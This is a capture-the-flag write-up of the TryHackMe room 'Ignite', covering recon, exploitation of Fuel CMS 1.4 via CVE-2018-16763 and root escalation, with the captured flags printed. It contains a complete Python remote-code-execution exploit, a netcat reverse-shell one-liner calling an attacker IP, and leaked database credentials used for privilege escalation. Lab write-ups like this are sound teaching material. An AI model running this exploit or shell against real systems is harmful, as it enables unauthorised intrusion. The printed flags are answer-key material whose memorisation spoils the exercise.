---
layout: single
title: "Ignite"
link: "https://tryhackme.com/room/ignite"
parent: TryHackMe
os: Linux
difficulty: Easy
tags: [Netcat, Python, Searchsploit]
starred: false
date: 2026-02-04
toc: true
toc_sticky: true
toc_label: "Mission Log"
toc_icon: "crosshairs"
---
# CTF Writeup: [{{ page.title }}]({{ page.machine_url }})
{% include ctf-badges.html %}

> **Link:** [**{{ page.parent }}**]({{ page.link }}) |
> **OS:** {{ page.os }} |
> **Difficulty:** {{ page.difficulty }} |
> **Date:** {{ page.date }} |
> **Author:** [*S3Z4R*](https://tryhackme.com/p/S3Z4R)

---
## 1. Reconnaissance
After starting the machine, first we need to understand what we are dealing with. By going to the web page we can see that the website is using `Fuel CMS 1.4`. That might be exploitable! But that's just an assumption! Let's gather more information first and move forward with evidence.

### Nmap Scanning
First we have to check the services running on the victim machine. We can use `Nmap` for this purpose:
```bash
❯ nmap -sV -sC -T4 <Machine-IP>
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for <Machine-IP>
Host is up (0.035s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/fuel/
|_http-title: Welcome to FUEL CMS
|_http-server-header: Apache/2.4.18 (Ubuntu)
```
We can only see `http:80` available here.

### Directory enumeration
Let's look for directories to see if we can find a clue. We use `feroxbuster` to find interesting subdirectories available for us to visit:
```bash
❯ feroxbuster -u http://<Machine-IP> -w kali-wordlists/dirb/big.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://<Machine-IP>/
 🚩  In-Scope Url          │ <Machine-IP>
 🚀  Threads               │ 50
 📖  Wordlist              │ kali-wordlists/dirb/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        0l        0w        0c http://<Machine-IP>/fuel/recent => http://<Machine-IP>/fuel/login
302      GET        0l        0w        0c http://<Machine-IP>/fuel/start => http://<Machine-IP>/fuel/dashboard
[...] - 3m     20469/20469   106/s   http://<Machine-IP>/fuel/
[...] - 4m     20469/20469   87/s    http://<Machine-IP>/assets/
[...] - 4m     20469/20469   78/s    http://<Machine-IP>/assets/cache/
[...] - 5m     20469/20469   73/s    http://<Machine-IP>/assets/css/
[...] - 4m     20469/20469   76/s    http://<Machine-IP>/assets/docs/
[...] - 5m     20469/20469   71/s    http://<Machine-IP>/fuel/licenses/
[...] - 5m     20469/20469   71/s    http://<Machine-IP>/fuel/modules/
```
By looking at the results, we can find out that the login page is: `http://<Machine-IP>/fuel/login`.

### Homepage
We still don't have any information on usernames or passwords. We should look for some more concrete information, for this purpose we start checking the homepage and another directories. We see that the password is actually on it's default settings and also visible on the home page:
```bash

That's it!

To access the FUEL admin, go to:
http://<Machine-IP>/fuel
User name: admin
Password: admin (you can and should change this password and admin user information after logging in)
```
So the username and password are both `admin`.

We can also see another additional information here:
```bash
Install the database

Install the FUEL CMS database by first creating the database in MySQL and then importing the fuel/install/fuel_schema.sql file. After creating the database, change the database configuration found in fuel/application/config/database.php to include your hostname (e.g. localhost), username, password and the database to match the new database you created.
```
So the database configs are located in `database.php`.

We can login into the CMS using `admin` as username and password, but after doing so we can see that it is an unfinished website and the CMS is more tricky than it looks.

Since I could not find any clues in the CMS panel, I decided to go back and look at the machine at hand from a different perspective.

## 2. Initial Access
We knew that the version of the CMS was `1.4`. Looking around and searching `Fuel CMS 1.4 exploit` we can find that there is indeed an exploit on [exploitdb](https://www.exploit-db.com/exploits/47138) that we can use. The exploit was written with `python 2`, I compiled it into python3 and then used it.

* **CMS Exploitation:** The vulnerability in Fuel CMS 1.4 allows for `Remote Code Execution (RCE)` via specially crafted requests, which served as our initial entry point into the system.

The exploit in python3:
```python3
import requests
from urllib.parse import quote
import re

TARGET_URL = "http://<Machine-IP>:80" # CHANGE THIS

def run_command(cmd):
    # Extract the output from the messy HTML/Errors
    delim = "::::"
    payload_cmd = f"echo {delim}; {cmd}; echo {delim}"

    # The PHP payload for CVE-2018-16763
    payload = f"'+pi(print($a='system'))+$a('{payload_cmd}')+'"
    url = f"{TARGET_URL}/fuel/pages/select/?filter={quote(payload)}"

    try:
        r = requests.get(url, timeout=10)

        # Use Regex to find everything between our :::: markers
        # The 's' flag allows matching across multiple lines (newlines)
        match = re.search(f"{delim}(.*?){delim}", r.text, re.DOTALL)

        if match:
            # Clean up the "system" prefix PHP adds and strip whitespace
            result = match.group(1).replace("system", "", 1).strip()
            return result
        else:
            return "[!] Could not parse command output. The target might be patched or unreachable."

    except Exception as e:
        return f"[!] Error: {str(e)}"

print("--- FUEL CMS 1.4.1 RCE Shell ---")
print(f"Target: {TARGET_URL}\n")

while True:
    user_input = input("fuel_shell> ").strip()

    if user_input.lower() in ["exit", "quit"]:
        break
    if not user_input:
        continue

    output = run_command(user_input)
    print(output)
```
The exploit uses `CVE-2018-16763` which crafts a payload and feeds it to the select in url, this causes the `RCE` we talked about using an HTTP request.

Now let's execute this exploit:
```bash
❯ python3 47138.py
--- FUEL CMS 1.4.1 RCE Shell ---
Target: http://<Machine-IP>:80

fuel_shell> whoami
www-data
```
Great! Now we have a basic entry shell to work with.

## 3. User Flag
We can find the flag next on:
```bash
fuel_shell> cat /home/www-data/flag.txt
6470e394cbf6dab6a91682cc8585059b
```

## 4. Priviledge Escalation
First Let's check the database config file that we saw on the homepage referred as `database.php` to see if we can find configurations and specially username and passwords:
```bash
$active_group = 'default';
$query_builder = TRUE;

$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);

// used for testing purposes
if (defined('TESTING'))
{
        @include(TESTER_PATH.'config/tester_database'.EXT);
}
```
We see that the password for `root` is `mememe`.

* **Notice:** Typically at this point we could have `SSH` to the machine, but as you remember, ssh service is not enabled on the victim machine. So all we have is the shell we took using the python exploit.

Now we need an `interactive shell` to be able to access root, because the current python shell is limited and a lot of commands will not run properly.

In order to do so, we need to get a new shell using `netcat`:
```bash
# On Victim machine:
# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.179.112 4444 >/tmp/f

On Attacker machine:
# nc -lnvp 4444
```
After executing we have:
```bash
❯ nc -lnvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from <Machine-IP>.
Ncat: Connection from <Machine-IP>:56584.
bash: cannot set terminal process group (1039): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html$ sudo su
sudo su
sudo: no tty present and no askpass program specified
```
A bit better, but still not a complete shell, the error means that there is not `virtual terminal` present to run our visually display our commands.

To obtain a fully interactive `TTY` shell, we can utilize a `Python pty module trick`.

* **pseudo-terminal (PTY):** A virtual terminal in Unix systems that acts like a real, physical terminal but exists only in software!

Knowing the concept behind python virtual terminal we can use the following command:
```bash
www-data@ubuntu:/var/www/html$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Now we have a `pty` and we can use:
```bash
www-data@ubuntu:/var/www/html$ su
su
Password: mememe

root@ubuntu:/var/www/html# whoami
root
```
The PTY we had, connected the two endpoints and we finally got the shell we wanted!

Now we should find the root flag.

## 5. Root Flag
It is located on:
```bash
root@ubuntu:/var/www/html# cat /root/root.txt
cat /root/root.txt
b9bbcb33e11b80be759c4e844862482d
```


---

{% comment %}

[Technique]: Fuel CMS Exploitation (RCE)
[Command]: python3 47138.py http://<IP>/
[Why]: Exploits CVE-2018-16763 in Fuel CMS 1.4 to execute remote code.

[Technique]: Shell Stabilization
[Command]: python -c 'import pty; pty.spawn("/bin/bash")'
[Why]: Upgrades a dumb netcat shell to a fully interactive TTY shell.

[Technique]: Reverse Shell Listener
[Command]: nc -lnvp 4444
[Why]: Catches the connection from the victim machine after executing the payload.

{% endcomment %}
